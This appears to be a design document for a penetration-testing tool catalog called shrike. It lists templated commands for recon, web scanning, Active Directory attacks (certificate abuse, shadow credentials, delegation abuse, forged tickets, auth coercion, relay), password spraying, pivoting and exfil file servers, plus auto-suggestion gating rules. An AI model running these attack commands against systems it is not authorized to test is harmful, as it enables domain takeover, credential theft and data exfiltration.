# shrike Tool Catalog Expansion

Research doc for adding catalog entries. Every row is written to drop into a Rust catalog entry.

**Placeholder set (only these are used in templates):**
`{ip} {port} {url} {domain} {dc_ip} {user} {pass} {nthash} {upn} {subnet} {iface} {wordlist} {userlist} {passlist} {vhostlist} {outfile} {outdir} {hashfile}`

**Field legend**
- **cred?** = needs valid domain/service credential to run
- **dom?** = needs a domain name
- **dc?** = needs a reachable Domain Controller
- **priv?** = needs an already-compromised/admin host or existing AD write/relay position
- **speed** = fast (<30s typical) / medium / slow (minutes+)
- **tty?** = needs a real interactive TTY (won't work in a captured/piped exec)

Already in catalog (DO NOT re-add): nmap, rustscan, masscan, httpx, whatweb, nuclei, feroxbuster, ffuf, gobuster, katana, nikto, wpscan, sqlmap, arjun, wafw00f, nxc/netexec, smbclient, smbmap, enum4linux-ng, rpcclient, showmount, snmpwalk, ldapsearch, bloodhound-python, certipy-find, GetNPUsers, GetUserSPNs, secretsdump, psexec/wmiexec, evil-winrm, ntlmrelayx, responder, mssqlclient, hashcat, john, chisel, ligolo, sshuttle, linpeas/winpeas/pspy, pypykatz, searchsploit.

---

## 1. OSINT / Subdomain / Recon (discovery)

| id | display | binary | phase | command template | required | cred/dom/dc/priv | speed | json flag / artifacts | tty | note |
|---|---|---|---|---|---|---|---|---|---|---|
| subfinder | Subfinder | `subfinder` | discovery | `subfinder -d {domain} -all -silent -oJ -o {outfile}` | {domain} | -/dom/-/- | fast | `-oJ` (JSONL) -> subdomains | n | Passive only; add API keys in `~/.config/subfinder/provider-config.yaml` for depth. |
| amass-passive | Amass (passive) | `amass` | discovery | `amass enum -passive -d {domain} -json {outfile}` | {domain} | -/dom/-/- | medium | `-json` -> subdomains | n | Use `-passive` to stay OPSEC-safe; active mode resolves/bruteforces and is loud. |
| dnsx | dnsx | `dnsx` | discovery | `dnsx -l {wordlist} -d {domain} -json -o {outfile}` | {domain} or {wordlist} | -/dom/-/- | fast | `-json` -> resolved hosts/A/CNAME | n | Resolver/permutation engine; feed subfinder output via stdin `-l -`. Great for wildcard filtering. |
| assetfinder | assetfinder | `assetfinder` | discovery | `assetfinder --subs-only {domain} > {outfile}` | {domain} | -/dom/-/- | fast | none (plain lines) -> subdomains | n | Tiny/fast, no JSON; pipe into dnsx/httpx. Good first-pass net. |
| gau | getallurls | `gau` | discovery | `gau --threads 5 --o {outfile} {domain}` | {domain} | -/dom/-/- | medium | `--json` -> historical URLs | n | Pulls URLs from Wayback/CommonCrawl/OTX/URLScan. Feed to httpx/dalfox. |
| waybackurls | waybackurls | `waybackurls` | discovery | `waybackurls {domain} > {outfile}` | {domain} | -/dom/-/- | medium | none -> historical URLs | n | Wayback only (subset of gau). Good for finding dead params/endpoints. |
| dnsrecon | DNSRecon | `dnsrecon` | discovery | `dnsrecon -d {domain} -n {dc_ip} -t std,axfr -j {outfile}` | {domain} | -/dom/-/- | medium | `-j` (JSON) -> DNS records | n | `-t axfr` attempts zone transfer; `-n` pins the resolver (use DC for AD). |
| fierce | fierce | `fierce` | discovery | `fierce --domain {domain} --dns-servers {dc_ip}` | {domain} | -/dom/-/- | medium | none -> hosts/zone-transfer | n | Zone-transfer + subdomain sweep; text output only, parse stdout. |
| theharvester | theHarvester | `theHarvester` | discovery | `theHarvester -d {domain} -b all -f {outfile}` | {domain} | -/dom/-/- | slow | `-f file.json` -> emails/hosts/names | n | Emails+hosts+employee names for spray lists; some sources need API keys. |

---

## 2. Web enumeration / crawling / screenshots

| id | display | binary | phase | command template | required | cred/dom/dc/priv | speed | json flag / artifacts | tty | note |
|---|---|---|---|---|---|---|---|---|---|---|
| dirsearch | dirsearch | `dirsearch` | dir-enum | `dirsearch -u {url} -w {wordlist} --format=json -o {outfile}` | {url} | -/-/-/- | medium | `--format=json` -> web-paths | n | Recursive with `-r`; smart extension handling. Alt to ffuf/ferox when you want built-in reporting. |
| gospider | GoSpider | `gospider` | web-enum | `gospider -s {url} -o {outdir} -c 10 -d 3` | {url} | -/-/-/- | medium | `--json` -> URLs/forms/js | n | Crawls + parses JS/robots/sitemap; `-d` depth. Pairs with dalfox for XSS. |
| hakrawler | hakrawler | `hakrawler` | web-enum | `echo {url} \| hakrawler -d 3 -u > {outfile}` | {url} | -/-/-/- | fast | `-json` -> URLs | n | Stdin-driven, extremely fast crawler; no browser (misses JS-rendered links). |
| dalfox | Dalfox | `dalfox` | vuln-scan | `dalfox url {url} --format json -o {outfile}` | {url} | -/-/-/- | medium | `--format json` -> XSS findings | n | XSS scanner. v3 (2026 Rust rewrite) uses `dalfox scan {url}` and auto-detects input; older Go v2 uses `dalfox url`. Pipe gau/gospider params in via stdin. |
| testssl | testssl.sh | `testssl.sh` | service-enum | `testssl.sh --jsonfile {outfile} {url}` | {url} | -/-/-/- | slow | `--jsonfile` -> TLS vulns/ciphers | n | Deep TLS/cipher/vuln audit (HEARTBLEED, ROBOT, etc). Slow; run once per host:port. |
| gowitness | gowitness | `gowitness` | web-enum | `gowitness scan file -f {wordlist} --write-db --screenshot-path {outdir}` | {wordlist} | -/-/-/- | medium | `--write-jsonl` -> screenshots+metadata | n | v3 syntax is `gowitness scan single/file/cidr/nmap`; single = `gowitness scan single -u {url}`. Chrome headless. |
| aquatone | Aquatone | `aquatone` | web-enum | `cat {wordlist} \| aquatone -out {outdir}` | {wordlist} | -/-/-/- | medium | `aquatone_session.json` -> screenshots/clusters | n | Reads host list on stdin, clusters similar pages into an HTML report. Legacy but still handy. |
| joomscan | JoomScan | `joomscan` | web-enum | `joomscan --url {url}` | {url} | -/-/-/- | medium | none -> Joomla vulns/components | n | Joomla-specific (components, versions, LFI). Text output, parse stdout. |
| droopescan | droopescan | `droopescan` | web-enum | `droopescan scan drupal -u {url}` | {url} | -/-/-/- | medium | none -> Drupal/SilverStripe versions | n | Drupal/SilverStripe/Moodle CMS scanner; the WPScan for non-WordPress CMS. |
| x8 | x8 | `x8` | api-enum | `x8 -u {url} -w {wordlist} -O json -o {outfile}` | {url}, {wordlist} | -/-/-/- | medium | `-O json` -> hidden params | n | Hidden GET/POST param discovery (Rust). Faster/more precise than arjun on big wordlists. |

---

## 3. AD attack — modern (certipy req/auth, DACL, shadow creds, coercion, relay)

Most of these require an existing foothold: a valid credential and often an AD write primitive discovered via BloodHound. `priv?=y` here means "needs an existing AD position/ACL," not local admin.

| id | display | binary | phase | command template | required | cred/dom/dc/priv | speed | json flag / artifacts | tty | note |
|---|---|---|---|---|---|---|---|---|---|---|
| certipy-req | Certipy req (ESC1) | `certipy-ad` / `certipy` | exploit | `certipy-ad req -u {upn} -p {pass} -dc-ip {dc_ip} -target {ip} -ca CA_NAME -template TEMPLATE -upn {upn}` | {upn},{pass},{dc_ip},{ip} | cred/dom/dc/priv | medium | `-out` -> .pfx cert | n | ESC1: supply arbitrary `-upn`/`-dns` SAN; newer Certipy also wants `-sid` of target for auth to succeed. CA_NAME/TEMPLATE from certipy-find. |
| certipy-auth | Certipy auth (PKINIT) | `certipy-ad` | cred-access | `certipy-ad auth -pfx {outfile} -dc-ip {dc_ip}` | {outfile}(.pfx),{dc_ip} | -/dom/dc/priv | fast | prints TGT + NT hash | n | Turns an ESC1/shadow-cred .pfx into a TGT and NTLM hash via Kerberos PKINIT. Feeds secretsdump/nxc. |
| certipy-shadow | Certipy shadow creds | `certipy-ad` | exploit | `certipy-ad shadow auto -u {upn} -p {pass} -dc-ip {dc_ip} -account {user}` | {upn},{pass},{dc_ip},{user} | cred/dom/dc/priv | medium | prints NT hash of target | n | Needs GenericWrite/GenericAll over target's msDS-KeyCredentialLink. `shadow auto` = add key + auth + cleanup. |
| certipy-relay | Certipy relay (ESC8/ESC11) | `certipy-ad` | exploit | `certipy-ad relay -target http://{ip} -template DomainController` | {ip} | -/-/-/priv | medium | `-out` -> .pfx cert | n | Relays coerced auth to AD CS web enrollment. Pair with coercer/PetitPotam. Replaces old adcspwn flow. |
| targetedkerberoast | targetedKerberoast | `targetedKerberoast.py` | cred-access | `targetedKerberoast.py -d {domain} -u {user} -p {pass} --dc-ip {dc_ip}` | {domain},{user},{pass},{dc_ip} | cred/dom/dc/priv | medium | `-o {hashfile}` -> TGS hashes | n | Sets a temp SPN on writable accounts, roasts, removes SPN. Needs GenericWrite over targets. Roasts users with no SPN. |
| rbcd | impacket rbcd.py | `rbcd.py` / `impacket-rbcd` | exploit | `rbcd.py -delegate-to TARGET$ -delegate-from ATTACKER$ -action write -dc-ip {dc_ip} {domain}/{user}:{pass}` | {domain},{user},{pass},{dc_ip} | cred/dom/dc/priv | fast | none -> writes msDS-AllowedToActOnBehalfOfOtherIdentity | n | RBCD: needs write over TARGET's delegation attr + control of ATTACKER$ machine acct. Then getST -u2u. |
| addcomputer | impacket addcomputer.py | `addcomputer.py` / `impacket-addcomputer` | exploit | `addcomputer.py -computer-name 'ATTACKER$' -computer-pass PASS -dc-ip {dc_ip} {domain}/{user}:{pass}` | {domain},{user},{pass},{dc_ip} | cred/dom/dc/- | fast | none -> new machine account | n | Uses default MachineAccountQuota=10. Provides the ATTACKER$ needed for RBCD/shadow-cred chains. |
| dacledit | impacket dacledit.py | `dacledit.py` / `impacket-dacledit` | exploit | `dacledit.py -action write -rights FullControl -principal {user} -target-dn TARGET_DN -dc-ip {dc_ip} {domain}/{user}:{pass}` | {domain},{user},{pass},{dc_ip} | cred/dom/dc/priv | fast | `-backup` -> old DACL for cleanup | n | Grants ACEs (GenericAll/WriteDACL) on a target object. Always `-backup` first to restore. |
| owneredit | impacket owneredit.py | `owneredit.py` / `impacket-owneredit` | exploit | `owneredit.py -action write -new-owner {user} -target TARGET -dc-ip {dc_ip} {domain}/{user}:{pass}` | {domain},{user},{pass},{dc_ip} | cred/dom/dc/priv | fast | none -> changes object owner | n | WriteOwner abuse: take ownership, then dacledit to grant yourself rights. Classic ACL chain step 1. |
| pywhisker | pyWhisker | `pywhisker` / `pywhisker.py` | exploit | `pywhisker -d {domain} -u {user} -p {pass} --target {user} --action add --dc-ip {dc_ip}` | {domain},{user},{pass},{dc_ip} | cred/dom/dc/priv | medium | `--filename` -> .pfx + cert | n | Shadow-cred via msDS-KeyCredentialLink; alt to certipy shadow. Output .pfx -> gettgtpkinit/PKINITtools. |
| ticketer | impacket ticketer.py | `ticketer.py` / `impacket-ticketer` | exploit | `ticketer.py -nthash {nthash} -domain-sid SID -domain {domain} {user}` | {nthash},{domain},{user} | -/dom/-/priv | fast | `.ccache` -> golden/silver ticket | n | Golden = krbtgt hash; silver = service acct hash + `-spn`. Needs domain SID (from lookupsid/nxc). |
| getST | impacket getST.py | `getST.py` / `impacket-getST` | cred-access | `getST.py -spn cifs/TARGET -impersonate Administrator -dc-ip {dc_ip} {domain}/ATTACKER$:PASS` | {domain},{dc_ip} | cred/dom/dc/priv | fast | `.ccache` -> impersonation TGS | n | S4U for constrained deleg / RBCD (`-u2u` for RBCD). `-impersonate` a privileged user. Export KRB5CCNAME after. |
| coercer | Coercer | `coercer` | exploit | `coercer coerce -u {user} -p {pass} -d {domain} -t {ip} -l {ip}` | {user},{pass},{domain},{ip} | cred/dom/-/priv | medium | `--export-json {outfile}` -> triggered methods | n | Sprays MS-EFSR/RPRN/DFSNM/etc to coerce auth to your listener/relay. `-l` = your relay IP. |
| petitpotam | PetitPotam | `PetitPotam.py` | exploit | `PetitPotam.py -u {user} -p {pass} -d {domain} {ip} {dc_ip}` | {ip}(listener),{dc_ip} | maybe/dom/dc/priv | fast | none -> coerced auth to listener | n | MS-EFSRPC coercion; args are `<listener> <target>`. Often works unauth on unpatched DCs. Feed to ntlmrelayx/certipy relay. |
| printerbug | PrinterBug | `printerbug.py` | exploit | `printerbug.py {domain}/{user}:{pass}@{dc_ip} {ip}` | {domain},{user},{pass},{dc_ip},{ip}(listener) | cred/dom/dc/priv | fast | none -> coerced auth | n | MS-RPRN spooler coercion. `{ip}` = your listener. Needs any valid domain cred. |
| mitm6 | mitm6 | `mitm6` | exploit | `mitm6 -d {domain} -i {iface}` | {domain},{iface} | -/dom/-/priv | slow | none -> DHCPv6/DNS takeover | n | IPv6 DNS spoof to relay to LDAP(S). Pair with ntlmrelayx `-6`. Loud on the wire; time-box it. |
| bloodyad | bloodyAD | `bloodyAD` | ad-enum | `bloodyAD --host {dc_ip} -d {domain} -u {user} -p {pass} get children` | {dc_ip},{domain},{user},{pass} | cred/dom/dc/- | fast | none -> AD objects/attrs | n | Swiss-army AD writes: `add genericAll DN target`, `add shadowCredentials target`, `set password`. Use `-k` for Kerberos. |
| ldapdomaindump | ldapdomaindump | `ldapdomaindump` | ad-enum | `ldapdomaindump -u '{domain}\\{user}' -p {pass} -o {outdir} {dc_ip}` | {domain},{user},{pass},{dc_ip} | cred/dom/dc/- | medium | `.json`+`.html` -> users/groups/computers | n | Dumps whole directory to browsable HTML/JSON/grep files. Great offline triage of users/computers. |
| windapsearch | windapsearch | `windapsearch` | ad-enum | `windapsearch --dc-ip {dc_ip} -d {domain} -u {user} -p {pass} --da` | {dc_ip},{domain} | cred/dom/dc/- | fast | `--json` -> users/groups/computers | n | Targeted LDAP queries (--da, --privileged-users, --unconstrained). Lighter than ldapdomaindump. |
| ldeep | ldeep | `ldeep` | ad-enum | `ldeep ldap -u {user} -p {pass} -d {domain} -s ldap://{dc_ip} all {outdir}` | {user},{pass},{domain},{dc_ip} | cred/dom/dc/- | medium | writes JSON per category | n | Rich LDAP dumper: trusts, gpo, delegations, pso. `all` writes many JSON files; also has `cache` offline queries. |
| adidnsdump | adidnsdump | `adidnsdump` | ad-enum | `adidnsdump -u {domain}\\{user} -p {pass} {dc_ip}` | {domain},{user},{pass},{dc_ip} | cred/dom/dc/- | medium | `-r` writes records.csv -> internal DNS | n | Dumps AD-integrated DNS zone (internal hostnames/IPs) any auth user can read. Great for target mapping. |

---

## 4. Credential attacks / cracking / wordlists

| id | display | binary | phase | command template | required | cred/dom/dc/priv | speed | json flag / artifacts | tty | note |
|---|---|---|---|---|---|---|---|---|---|---|
| kerbrute-userenum | Kerbrute userenum | `kerbrute` | ad-enum | `kerbrute userenum -d {domain} --dc {dc_ip} {userlist} -o {outfile}` | {domain},{dc_ip},{userlist} | -/dom/dc/- | fast | none -> valid usernames | n | Unauth username validation via Kerberos pre-auth (no lockouts, no logs on failure). Best first AD step. |
| kerbrute-spray | Kerbrute passwordspray | `kerbrute` | cred-access | `kerbrute passwordspray -d {domain} --dc {dc_ip} {userlist} {pass}` | {domain},{dc_ip},{userlist},{pass} | -/dom/dc/- | fast | none -> valid creds | n | One password vs many users. WATCH lockout policy — one spray per policy window. `--safe` aborts on lockout. |
| cewl | CeWL | `cewl` | cracking | `cewl -d 3 -m 5 -w {outfile} {url}` | {url} | -/-/-/- | medium | none -> custom wordlist | n | Scrapes site to build target-specific wordlist. `-d` depth, `-m` min length; `--with-numbers` for mangling seed. |
| cupp | CUPP | `cupp` | cracking | `cupp -i` | (none) | -/-/-/- | fast | writes `<name>.txt` -> wordlist | y | Interactive profiler that builds password lists from a person's info. TTY-only; use `-w` to improve an existing list non-interactively. |

**hashcat rules note (not a new binary — a param for the existing hashcat entry):**
Add `-r /usr/share/hashcat/rules/best64.rule` (or `rockyou-30000.rule`, `OneRuleToRuleThemAll.rule`) to any hashcat catalog invocation to multiply a wordlist. Template fragment: `hashcat -m MODE {hashfile} {wordlist} -r /usr/share/hashcat/rules/best64.rule`. best64 = fast/high-ROI default; OneRule = slow/thorough.

---

## 5. Pivot / post-exploitation / file transfer

| id | display | binary | phase | command template | required | cred/dom/dc/priv | speed | json flag / artifacts | tty | note |
|---|---|---|---|---|---|---|---|---|---|---|
| socat-relay | socat relay | `socat` | pivot | `socat TCP-LISTEN:{port},fork,reuseaddr TCP:{ip}:{port}` | {port},{ip} | -/-/-/priv | fast | none -> port forward | n | Simple TCP relay/port-forward on a foothold. Also `socat TCP-LISTEN:443,fork TCP:127.0.0.1:445` for relay tricks. |
| ligolo-agent | Ligolo-ng agent | `agent` | pivot | `agent -connect {ip}:{port} -ignore-cert` | {ip},{port} | -/-/-/priv | fast | none -> tunnel (agent side) | n | Runs ON the compromised host; connects back to your `proxy` listener. Then `ifconfig`+`start` on proxy side to route {subnet}. |
| proxychains | proxychains-ng | `proxychains4` | pivot | `proxychains4 -f CONFIG nmap -sT -Pn {ip}` | {ip} | -/-/-/priv | slow | none -> proxied tooling | n | Wrap any tool to route via SOCKS. Config points at chisel/ligolo SOCKS port. Use `-sT -Pn` (no SYN/ICMP over SOCKS). |
| impacket-smbserver | impacket smbserver | `smbserver.py` / `impacket-smbserver` | post-exploit | `smbserver.py -smb2support SHARE {outdir}` | {outdir} | -/-/-/priv | fast | none -> file transfer share | n | Instant SMB share for exfil/tool drop. Add `-user U -password P` to satisfy Win10/11 that block guest. |
| updog | updog | `updog` | post-exploit | `updog -d {outdir} -p {port}` | {outdir},{port} | -/-/-/priv | fast | none -> HTTP file server (up+down) | n | HTTP server WITH upload form — payload hosting + exfil in one. `--ssl` for TLS. Alt to `python -m http.server`. |

---

## 6. Cloud (brief / optional)

| id | display | binary | phase | command template | required | cred/dom/dc/priv | speed | json flag / artifacts | tty | note |
|---|---|---|---|---|---|---|---|---|---|---|
| pacu | Pacu | `pacu` | post-exploit | `pacu` | (none) | cred/-/-/priv | medium | writes to session DB -> AWS findings | y | Interactive AWS exploitation framework; needs AWS keys imported. TTY-driven module runner. |
| scoutsuite | ScoutSuite | `scout` | vuln-scan | `scout aws --report-dir {outdir}` | (none) | cred/-/-/- | slow | HTML+`.js` json -> multi-cloud misconfigs | n | Read-only multi-cloud (aws/azure/gcp) posture audit. Needs read creds; produces a big HTML report. |
| prowler | Prowler | `prowler` | vuln-scan | `prowler aws -M json-ocsf -o {outdir}` | (none) | cred/-/-/- | slow | `-M json-ocsf/json` -> CIS/compliance findings | n | CIS/compliance + attack-path checks for aws/azure/gcp/k8s. Very thorough, slow. |
| trivy | Trivy | `trivy` | vuln-scan | `trivy image -f json -o {outfile} IMAGE` | (none) | -/-/-/- | medium | `-f json` -> CVEs/misconfig/secrets | n | Scans container images/filesystems/IaC/repos for CVEs+secrets. `trivy fs {outdir}` for local dir. |
| kube-hunter | kube-hunter | `kube-hunter` | vuln-scan | `kube-hunter --remote {ip} --report json` | {ip} | -/-/-/- | medium | `--report json` -> k8s vulns | n | Hunts Kubernetes cluster weaknesses (remote/network/pod modes). Deprecated upstream but still used in labs. |

---

## 7. Utility (ProjectDiscovery pipeline glue)

| id | display | binary | phase | command template | required | cred/dom/dc/priv | speed | json flag / artifacts | tty | note |
|---|---|---|---|---|---|---|---|---|---|---|
| naabu | naabu | `naabu` | port-scan | `naabu -host {ip} -top-ports 1000 -json -o {outfile}` | {ip} | -/-/-/- | fast | `-json` -> open ports | n | Fast SYN/CONNECT port scan; `-nmap-cli 'nmap -sV'` chains straight into nmap. Good rustscan alternative in PD stacks. |
| tlsx | tlsx | `tlsx` | service-enum | `tlsx -u {ip}:{port} -json -o {outfile}` | {ip},{port} | -/-/-/- | fast | `-json` -> CN/SAN/issuer/ciphers | n | Grabs TLS cert data (SANs = free subdomains/vhosts, expiry, JARM). Feed SANs back into dnsx/httpx. |
| notify | notify | `notify` | discovery | `notify -data {outfile} -bulk` | {outfile} | -/-/-/- | fast | none -> pushes to Slack/Discord/tg | n | Not a scanner — pipes any tool output to chat/webhooks. Config in `~/.config/notify/provider-config.yaml`. |

---

## 8. Structured-output cheat sheet (what to parse)

Only tools that emit machine-parseable output are listed. Prefer these flags when wiring result parsers.

| tool | flag | format | parse for |
|---|---|---|---|
| subfinder | `-oJ` | JSONL | subdomains (`host`) |
| amass | `-json` | JSON | subdomains, sources, IPs |
| dnsx | `-json` | JSONL | resolved host, A/AAAA/CNAME, status |
| gau | `--json` | JSON | historical URLs |
| dnsrecon | `-j` | JSON | DNS records (A/MX/NS/SRV/AXFR) |
| theHarvester | `-f x.json` | JSON | emails, hosts, employee names |
| dirsearch | `--format=json` | JSON | web-paths, status, size |
| gospider | `--json` | JSONL | URLs, forms, JS endpoints |
| hakrawler | `-json` | JSONL | URLs |
| dalfox | `--format json` | JSON/JSONL | XSS findings, PoC params |
| testssl.sh | `--jsonfile` | JSON | TLS vulns, weak ciphers, cert issues |
| gowitness | `--write-jsonl` (+ SQLite db) | JSONL | screenshot paths, title, status, tech |
| aquatone | `aquatone_session.json` | JSON | screenshots, page clusters |
| x8 | `-O json` | JSON | hidden params |
| certipy (find) | `-json` | JSON | vuln templates/ESC classes |
| bloodyAD | (text) | text | AD objects/attrs — no JSON, scrape stdout |
| ldapdomaindump | (default) | JSON + HTML + grep | users, groups, computers, trusts |
| windapsearch | `--json` | JSON | users, groups, computers |
| ldeep | (default) | JSON per category | trusts, delegations, GPO, PSO |
| adidnsdump | `-r` | CSV | internal DNS records (host->IP) |
| kerbrute | `-o` | text | valid usernames / valid creds (scrape lines) |
| targetedKerberoast | `-o` | text (hashcat) | TGS-REP hashes (mode 13100) |
| naabu | `-json` | JSONL | open ports |
| tlsx | `-json` | JSONL | CN, SAN list, issuer, JARM |
| trivy | `-f json` | JSON | CVEs, secrets, misconfig |
| prowler | `-M json-ocsf` | JSON (OCSF) | compliance/security findings |
| scoutsuite | report `.js` | JSON-in-JS | multi-cloud misconfigs |
| kube-hunter | `--report json` | JSON | k8s vulnerabilities |
| pacu | session sqlite | DB | AWS enum/exploit results |

---

## Gating hints for suggestion engine (quick reference)

- **Unauth, safe to auto-suggest early:** subfinder, amass-passive, dnsx, assetfinder, gau, waybackurls, dnsrecon, fierce, theHarvester, dirsearch, gospider, hakrawler, dalfox, testssl, gowitness, aquatone, joomscan, droopescan, x8, naabu, tlsx, kerbrute-userenum.
- **Needs a valid domain credential (gate behind cred-access success):** targetedKerberoast, rbcd, addcomputer, dacledit, owneredit, pywhisker, getST, coercer, printerbug, bloodyAD, ldapdomaindump, windapsearch, ldeep, adidnsdump, kerbrute-spray (userlist only, no cred), certipy-req/shadow.
- **Needs an existing AD write primitive / ACL (gate behind BloodHound path):** targetedKerberoast, rbcd, dacledit, owneredit, pywhisker, certipy-shadow.
- **Needs a relay/coercion position (loud, confirm before firing):** certipy-relay, coercer, petitpotam, printerbug, mitm6, ntlmrelayx(existing).
- **Needs a foothold host (post-ex):** socat-relay, ligolo-agent, proxychains, impacket-smbserver, updog, pacu.
- **TTY-only (don't run in captured exec):** cupp, pacu. (evil-winrm/psexec already flagged in existing catalog.)
- **Lockout risk (rate-gate):** kerbrute-spray — one attempt per lockout-policy window.
